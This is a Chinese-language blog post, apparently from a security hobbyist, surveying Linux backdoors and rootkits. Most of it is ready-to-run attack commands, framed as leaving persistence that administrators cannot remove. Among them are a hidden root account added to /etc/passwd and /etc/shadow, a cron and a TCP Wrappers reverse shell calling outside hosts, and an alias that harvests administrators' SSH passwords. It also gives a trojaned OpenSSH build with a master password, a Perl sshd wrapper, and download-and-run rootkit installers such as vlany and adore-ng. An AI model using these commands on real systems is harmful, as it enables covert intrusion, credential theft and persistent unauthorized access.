@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Linux rootkit 初探 | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="前言：本文是在一篇安全课的文章的基础上研究探索的，留后门并让主机管理员在发现后也无法将你清除是一件非常愉快的事情。rootkit技术已经不算是一个新的技术了，作为一个web狗说一说计划任务弹shell的还好，当讨论起来如何hook系统调用来写ring0的rootkit就捉襟见肘了。这篇文章算是rootkit的初探，也是让自己未来在rootkit方面多多了解一些。 一款优秀的后门具有： 文件隐藏：通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux rootkit 初探">
+<meta property="og:url" content="http://hebic.me/2018/11/02/Linux-rootkit-初探/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="前言：本文是在一篇安全课的文章的基础上研究探索的，留后门并让主机管理员在发现后也无法将你清除是一件非常愉快的事情。rootkit技术已经不算是一个新的技术了，作为一个web狗说一说计划任务弹shell的还好，当讨论起来如何hook系统调用来写ring0的rootkit就捉襟见肘了。这篇文章算是rootkit的初探，也是让自己未来在rootkit方面多多了解一些。 一款优秀的后门具有： 文件隐藏：通">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-11-02T12:42:26.442Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux rootkit 初探">
+<meta name="twitter:description" content="前言：本文是在一篇安全课的文章的基础上研究探索的，留后门并让主机管理员在发现后也无法将你清除是一件非常愉快的事情。rootkit技术已经不算是一个新的技术了，作为一个web狗说一说计划任务弹shell的还好，当讨论起来如何hook系统调用来写ring0的rootkit就捉襟见肘了。这篇文章算是rootkit的初探，也是让自己未来在rootkit方面多多了解一些。 一款优秀的后门具有： 文件隐藏：通">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一款优秀的后门具有："><span class="toc-text">一款优秀的后门具有：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#用户级别后门"><span class="toc-text">用户级别后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#增加超级用户（需要root）"><span class="toc-text">增加超级用户（需要root）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tsh后门"><span class="toc-text">tsh后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端："><span class="toc-text">服务端：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端："><span class="toc-text">客户端：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计划任务后门"><span class="toc-text">计划任务后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH公钥登录"><span class="toc-text">SSH公钥登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alias后门"><span class="toc-text">alias后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH软连接后门（需要root）"><span class="toc-text">SSH软连接后门（需要root）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH后门（需要root）"><span class="toc-text">SSH后门（需要root）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-wrapper-后门（需要root）"><span class="toc-text">SSH wrapper 后门（需要root）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改inetd配置文件后门（需要安装inetd，默认没有安装）"><span class="toc-text">修改inetd配置文件后门（需要安装inetd，默认没有安装）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP通讯后门"><span class="toc-text">ICMP通讯后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Git-hook-backdoor"><span class="toc-text">Git-hook backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PROMPT-COMMAND后门"><span class="toc-text">PROMPT_COMMAND后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP-Wrappers（需要root）"><span class="toc-text">TCP Wrappers（需要root）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#“-rhosts”文件后门（测试失败）"><span class="toc-text">“.rhosts”文件后门（测试失败）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内核级别后门"><span class="toc-text">内核级别后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#系统调用"><span class="toc-text">系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统调用的hook"><span class="toc-text">系统调用的hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序的连接和装载"><span class="toc-text">程序的连接和装载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hook-LD-PRELOAD后门"><span class="toc-text">Hook LD_PRELOAD后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Knark"><span class="toc-text">Knark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#adore-ng"><span class="toc-text">adore-ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kbeast"><span class="toc-text">Kbeast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enyelkm"><span class="toc-text">enyelkm</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#硬件级别后门"><span class="toc-text">硬件级别后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bios后门"><span class="toc-text">bios后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他类型"><span class="toc-text">其他类型</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-Linux-rootkit-初探" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Linux rootkit 初探</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.11.02</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2018/11/02/Linux-rootkit-初探/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>本文是在一篇安全课的文章的基础上研究探索的，留后门并让主机管理员在发现后也无法将你清除是一件非常愉快的事情。rootkit技术已经不算是一个新的技术了，作为一个web狗说一说计划任务弹shell的还好，当讨论起来如何hook系统调用来写ring0的rootkit就捉襟见肘了。这篇文章算是rootkit的初探，也是让自己未来在rootkit方面多多了解一些。</p>
+<h1 id="一款优秀的后门具有："><a href="#一款优秀的后门具有：" class="headerlink" title="一款优秀的后门具有："></a>一款优秀的后门具有：</h1><ul>
+<li>文件隐藏：通过ls等命令无法发现：可以hook sys_getdents64或者readdir</li>
+<li>进程隐藏：通过ps等命令无法发现：读取进程是读取/proc进程目录，可以hook sys_getdents64或者readdir</li>
+<li>连接隐藏：netstat无法发现：<code>netstat是读取/proc文件系统下的net/tcp和net/udp文件获得当前连接信息，因此可以通过hook sys_read调用实现隐藏连接，也可以修改tcp4_seq_show和udp4_seq_show等函数实现。</code></li>
+<li>隐藏日志：无history</li>
+<li>网路嗅探：<code>通过libpcap库直接访问链路层，截获数据包</code></li>
+<li>密码嗅探：可以通过hook sys_read制作login后门。</li>
+</ul>
+<h1 id="用户级别后门"><a href="#用户级别后门" class="headerlink" title="用户级别后门"></a>用户级别后门</h1><p>用户级别后门值得是留后门的过程不会涉及到对系统调用的劫持修改，后门在用户态修改，不涉及内核态。用户级别后门容易留，容易被发现。</p>
+<h2 id="增加超级用户（需要root）"><a href="#增加超级用户（需要root）" class="headerlink" title="增加超级用户（需要root）"></a>增加超级用户（需要root）</h2><p><code>echo &quot;backdooruser:x:999:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code></p>
+<p><code>echo &quot;backdooruser:$6$IRZ4H1HG$x7375skwAG49qJ0fr0FlmKSURIR0fPcP.isV1NjUyW0uAo9gtXybc3wT/t0fczip8lVqifNLHC7B349sKt0S1.:17791:0:99999:7:::&quot; &gt;&gt; /etc/shadow</code></p>
+<p>密码：1234qwer@QWER</p>
+<h2 id="tsh后门"><a href="#tsh后门" class="headerlink" title="tsh后门"></a>tsh后门</h2><p>Orange大神写的后门，在新老内核的兼容性非常好，支持正向或者反向链接。</p>
+<p><code>git clone https://github.com/orangetw/tsh.git</code></p>
+<h3 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h3><p>修改tsh.h中的端口，密码，伪装进程名<br>删除两行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define CONNECT_BACK_HOST  &quot;120.25.80.195&quot;</span><br><span class="line">#define CONNECT_BACK_DELAY 60</span><br></pre></td></tr></table></figure></p>
+<p>运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">umask 077; HOME=/var/tmp ./tshd</span><br></pre></td></tr></table></figure></p>
+<h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><p>修改tsh.h中的端口和密码和ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">./tsh ip &quot;命令&quot;</span><br></pre></td></tr></table></figure></p>
+<p>备注：在mac上需要修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-#include &lt;pty.h&gt;</span><br><span class="line">+#include &lt;util.h&gt;</span><br></pre></td></tr></table></figure></p>
+<p>否则编译不成功</p>
+<p>备注：如果使用反向连接，使用<code>./tsh cb</code>监听</p>
+<h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><p>每分钟给t-t.win的53端口弹一次shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l &gt; crontab.bak;echo &quot;* * * * * /bin/sh -i &gt;&amp; /dev/tcp/t-t.win/53 0&gt;&amp;1&quot; &gt;&gt; crontab.bak;crontab crontab.bak;rm crontab.bak;</span><br></pre></td></tr></table></figure></p>
+<p>在ubuntu中需要执行<code>ln -s -f bash /bin/sh</code>才可以成功。因为crontab中的shell环境是sh，在ubuntu中sh是dash的软连接，需要修改成bash的软连接才可以反弹shell。</p>
+<h2 id="SSH公钥登录"><a href="#SSH公钥登录" class="headerlink" title="SSH公钥登录"></a>SSH公钥登录</h2><p>通过命令<code>ssh-keygen -t rsa</code>生成公钥，将生成的id_rsa.pub文件写入服务器的authorized_keys中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br><span class="line">chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure></p>
+<h2 id="alias后门"><a href="#alias后门" class="headerlink" title="alias后门"></a>alias后门</h2><p>在当前用户目录的<code>.bashrc</code>中写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos;</span><br></pre></td></tr></table></figure></p>
+<p>strace命令可以跟踪进程运行时，系统调用和接受的信号。<br>这条命令在管理员使用ssh时生效，后门将终端的输入输出（包括输入的ssh地址账号密码）和连接信息保存到<code>/tmp/sshpwd-日期.log中</code>，在一些小型的网站中，可以将写入的地址设置为web目录一些深层，管理员不易发现的地方。日后通过浏览器访问，就可以得到管理员在这台机器上远程登录其他服务器ssh的地址账号密码等等了。<br>这只是一种方法，可以在管理员必备的命令中加入一些后门，比如<code>ls</code>这样的命令。</p>
+<h2 id="SSH软连接后门（需要root）"><a href="#SSH软连接后门（需要root）" class="headerlink" title="SSH软连接后门（需要root）"></a>SSH软连接后门（需要root）</h2><p>执行<code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337</code><br>其他机器使用ssh 任意存在用户@IP -p 31337使用任意密码可登陆。<br>原理是PAM根据软连接文件名称在<code>/etc/pam.d/</code>中寻找对应的文件名，使用其中的配置文件登陆。因此，这种方法需要SSH开启PAM登陆，默认开启。</p>
+<p>参考：<br><a href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/" target="_blank" rel="noopener">http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/</a></p>
+<h2 id="SSH后门（需要root）"><a href="#SSH后门（需要root）" class="headerlink" title="SSH后门（需要root）"></a>SSH后门（需要root）</h2><p>编译特定版本的新的SSH达到双密码登录的效果，需要替换服务端的SSH，动静比较大。Ubuntu16.04测试失败，Ubuntu14.04测试成功。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://link.jianshu.com/?t=http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz</span><br><span class="line">wget https://link.jianshu.com/?t=http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz</span><br><span class="line">tar zxvf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxvf openssh-5.9p1.patch.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br></pre></td></tr></table></figure>
+<p>修改想要登录的密码<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@localhost openssh-5.9p1# vim includes.h</span><br><span class="line">int secret_ok;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="meta">#</span>define ILOG "/tmp/ilog"  # 记录登录到本机的用户名和密码</span><br><span class="line"><span class="meta">#</span>define OLOG "/tmp/olog"  # 记录本机登录到远程的用户名和密码</span><br><span class="line"><span class="meta">#</span>define SECRETPW "warden" # 远程连接密码</span><br><span class="line"><span class="meta">#</span>endif /* INCLUDES_H */</span><br></pre></td></tr></table></figure></p>
+<p>修改想要ssh版本（通过ssh -V查看当前ssh版本）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@localhost openssh-5.9p1# vim version.h</span><br><span class="line">/* $OpenBSD: version.h,v 1.62 2011/08/02 23:13:01 djm Exp $ */</span><br><span class="line"><span class="meta">#</span>define SSH_VERSION "OpenSSH_5.3p1"</span><br><span class="line"><span class="meta">#</span>define SSH_PORTABLE "p1"</span><br><span class="line"><span class="meta">#</span>define SSH_RELEASE SSH_VERSION SSH_PORTABLE</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y openssl libssl-dev libpam0g-dev</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+<p>就可以使用自己设置的密码登录了。</p>
+<p>参考：<br><a href="https://www.jianshu.com/p/c1cd73b072f1" target="_blank" rel="noopener">https://www.jianshu.com/p/c1cd73b072f1</a></p>
+<h2 id="SSH-wrapper-后门（需要root）"><a href="#SSH-wrapper-后门（需要root）" class="headerlink" title="SSH wrapper 后门（需要root）"></a>SSH wrapper 后门（需要root）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo '#!/usr/bin/perl' &gt;sshd</span><br><span class="line">echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd</span><br><span class="line">echo 'exec&#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,' &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure>
+<p>连接方式：<code>socat STDIO TCP4:target_ip:22,sourceport=13377</code><br>Ubuntu14.04测试成功，16.04测试失败</p>
+<h2 id="修改inetd配置文件后门（需要安装inetd，默认没有安装）"><a href="#修改inetd配置文件后门（需要安装inetd，默认没有安装）" class="headerlink" title="修改inetd配置文件后门（需要安装inetd，默认没有安装）"></a>修改inetd配置文件后门（需要安装inetd，默认没有安装）</h2><p>在<code>/etc/inetd.conf</code>文件中添加一行<code>daytime stream tcp nowait root /bin/bash bash -i</code><br>用nc随意连接一个端口即可成功。如果没有安装需要手动安装，需要root权限。Ubuntu 14.04测试失败。<br>参考：<a href="https://blog.csdn.net/d_0xff/article/details/51521075" target="_blank" rel="noopener">https://blog.csdn.net/d_0xff/article/details/51521075</a></p>
+<h2 id="ICMP通讯后门"><a href="#ICMP通讯后门" class="headerlink" title="ICMP通讯后门"></a>ICMP通讯后门</h2><p>记得修改prism.c文件中的密码和反弹地址<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/andreafabrizi/prism.git</span><br><span class="line">gcc &lt;..OPTIONS..&gt; -Wall -s -o prism prism.c</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项如下:</span><br><span class="line">-DDETACH #后台运行</span><br><span class="line">-DSTATIC #开启STATIC模式 (默认ICMP模式)</span><br><span class="line">-DNORENAME #不使用自定义的进程名</span><br><span class="line">-DIPTABLES #清空所有的iptables规则</span><br></pre></td></tr></table></figure>
+<p>攻击机（172.16.100.182）：<code>nc -vv -l -p 6666</code><br>肉鸡（172.16.100.134）：<code>./prism</code><br>攻击机（172.16.100.182）：<code>./sendPacket.py 172.16.100.134 p4ssw0rd 172.16.100.182 6666</code></p>
+<p>参考：<a href="http://vinc.top/2016/09/28/linux%E4%B8%8Bicmp%E5%90%8E%E9%97%A8prism/" target="_blank" rel="noopener">http://vinc.top/2016/09/28/linux%E4%B8%8Bicmp%E5%90%8E%E9%97%A8prism/</a></p>
+<p>除了使用ICMP，还可以使用DNS等其他的协议作为通讯后门。</p>
+<h2 id="Git-hook-backdoor"><a href="#Git-hook-backdoor" class="headerlink" title="Git-hook backdoor"></a>Git-hook backdoor</h2><p>在安装git和xterm的机器上可以使用此种方法。<br>参考：<a href="https://github.com/ulissescastro/linux-native-backdoors/tree/master/git-hooks" target="_blank" rel="noopener">https://github.com/ulissescastro/linux-native-backdoors/tree/master/git-hooks</a></p>
+<h2 id="PROMPT-COMMAND后门"><a href="#PROMPT-COMMAND后门" class="headerlink" title="PROMPT_COMMAND后门"></a>PROMPT_COMMAND后门</h2><p>PROMPT_COMMAND是bash的一个环境变量，他会在用户执行命令前执行。<br>将反弹shell的命令放入PROMPT_COMMAND中，管理员只要使用bash就会反弹shell。</p>
+<h2 id="TCP-Wrappers（需要root）"><a href="#TCP-Wrappers（需要root）" class="headerlink" title="TCP Wrappers（需要root）"></a>TCP Wrappers（需要root）</h2><p>向/etc/hosts.allow中写入<code>ALL: ALL: spawn (bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/&lt;Attack IP&gt;/443 0&gt;&amp;1&quot;) &amp; :allow</code><br>攻击者执行<code>nc -lvvp 443</code>监听443端口，接下来通过执行<code>ssh qweqwe@VictimIP</code>触发</p>
+<h2 id="“-rhosts”文件后门（测试失败）"><a href="#“-rhosts”文件后门（测试失败）" class="headerlink" title="“.rhosts”文件后门（测试失败）"></a>“.rhosts”文件后门（测试失败）</h2><p>向~/.rhosts中写入”+ +”，就可以让任何用户无密码登录</p>
+<p>Linux的内核态与用户态分析：<a href="https://www.cnblogs.com/bakari/p/5520860.html" target="_blank" rel="noopener">https://www.cnblogs.com/bakari/p/5520860.html</a><br>基于内存分析的rootkit检测技术：<a href="http://www.vuln.cn/6324" target="_blank" rel="noopener">http://www.vuln.cn/6324</a><br>Linux rootkit总结：<a href="http://www.cnblogs.com/LittleHann/p/3879961.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/3879961.html?utm_source=tuicool&amp;utm_medium=referral</a></p>
+<h1 id="内核级别后门"><a href="#内核级别后门" class="headerlink" title="内核级别后门"></a>内核级别后门</h1><p>内核级别后门包括不限于对系统调用的Hook，函数API的hook，以及直接操作内核函数。几乎全部后门都需要root权限，对后门编写者linux内核知识和C的要求比较高。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><h3 id="系统调用的hook"><a href="#系统调用的hook" class="headerlink" title="系统调用的hook"></a>系统调用的hook</h3><p>ring 3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x1: LD_PRELOAD动态连接.so函数劫持</span><br><span class="line">0x2: 使用snoopy进行execve/execv、connect、init_module hook </span><br><span class="line">0x3: 绕过基于Linux消息队列(Message Queue)通信的Hook模块</span><br><span class="line">0x4: 基于PD_PRELOAD、LD_LIBRARY_PATH环境变量劫持绕过Hook模块</span><br><span class="line">0x5: 基于ptrace()调试技术进行API Hook</span><br><span class="line">0x6: 绕过C库LD_PRELOAD机制的技术方案</span><br><span class="line">0x7: 基于PLT劫持、PLT重定向技术实现Hook</span><br></pre></td></tr></table></figure></p>
+<p>ring 0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x1: Kernel Inline Hook </span><br><span class="line">0x2: 利用0x80中断劫持system_call-&gt;sys_call_table进行系统调用Hook</span><br><span class="line">0x3: 获取sys_call_table的常用方法</span><br><span class="line">0x4: 利用Linux内核机制kprobe机制(kprobes, jprobe和kretprobe)进行系统调用Hook</span><br><span class="line">0x5: LSM(linux security module) Security钩子技术(linux原生机制)</span><br><span class="line">0x6: LSM Function Replace Hook劫持技术</span><br><span class="line">0x7: int 80中断劫持技术</span><br><span class="line">0x8: 利用从PAGE_OFFSET起始位置搜索特征码劫持system_call_sys_call_table进行系统调用hook</span><br><span class="line">0x9: Linux LSM(Linux Security Modules) Hook技术</span><br></pre></td></tr></table></figure></p>
+<h3 id="程序的连接和装载"><a href="#程序的连接和装载" class="headerlink" title="程序的连接和装载"></a>程序的连接和装载</h3><h2 id="Hook-LD-PRELOAD后门"><a href="#Hook-LD-PRELOAD后门" class="headerlink" title="Hook LD_PRELOAD后门"></a>Hook LD_PRELOAD后门</h2><p>Ring 0中Hook LD_PRELOAD的后门。在LD_PRELOAD中可以定义Linux运行程序前“动态加载”的动态链接库，只要在LD_PRELOAD中加载的.so中编写同名函数，后面引入的符号会被省略。<br>​<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh &amp;&amp; chmod +x /tmp/quick_install.sh &amp;&amp; /tmp/quick_install.sh</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://github.com/mempodippy/vlany" target="_blank" rel="noopener">https://github.com/mempodippy/vlany</a></p>
+<p>参考：<a href="http://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">http://www.freebuf.com/column/162604.html</a></p>
+<h3 id="Knark"><a href="#Knark" class="headerlink" title="Knark"></a>Knark</h3><p>LKM层rootkit<br><a href="https://packetstormsecurity.com/fils/24853/knark-2.4.3.tgz.html" target="_blank" rel="noopener">https://packetstormsecurity.com/fils/24853/knark-2.4.3.tgz.html</a></p>
+<h3 id="adore-ng"><a href="#adore-ng" class="headerlink" title="adore-ng"></a>adore-ng</h3><p><a href="https://github.com/trimpsyw/adore-ng" target="_blank" rel="noopener">https://github.com/trimpsyw/adore-ng</a><br>内核版本：2.6 and 3.x，虽然有些老，但已经可以在ubuntu13.04（X86）上使用了。<br>成功内核版本：2.6.32-358.el6.x86_64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install kernel-devel</span><br><span class="line">wget https://github.com/trimpsyw/adore-ng/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line">cd adore-ng-master</span><br><span class="line">make</span><br><span class="line">./ava I</span><br></pre></td></tr></table></figure>
+<p>作为一个内核级别的后门，通过<code>./ava help</code>看到它支持的功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Usage: ./ava &#123;h,u,r,R,i,v,U&#125; [file or PID]</span><br><span class="line"></span><br><span class="line">       I print info (secret UID etc)</span><br><span class="line">       h hide file</span><br><span class="line">       u unhide file</span><br><span class="line">       r execute as root</span><br><span class="line">       R remove PID forever</span><br><span class="line">       U uninstall adore</span><br><span class="line">       i make PID invisible</span><br><span class="line">       v make PID visible</span><br></pre></td></tr></table></figure></p>
+<p>功能比较简单，分别是：隐藏文件，显示文件，提权，移除PID，移除adore，隐藏PID，显示PID。<br>用法比较简单，如果你想隐藏/etc/passwd的话就用<code>./ava h /etc/passwd</code>，想提权就用<code>./ava r /bin/bash</code></p>
+<h3 id="Kbeast"><a href="#Kbeast" class="headerlink" title="Kbeast"></a>Kbeast</h3><p>开发者在2012年编写的kernel ootkit，内核版本支持：2.6.18 and 2.6.32。查看内核版本的命令<code>cat /proc/version</code>，现在已经4.15了。适用范围已经很窄了。</p>
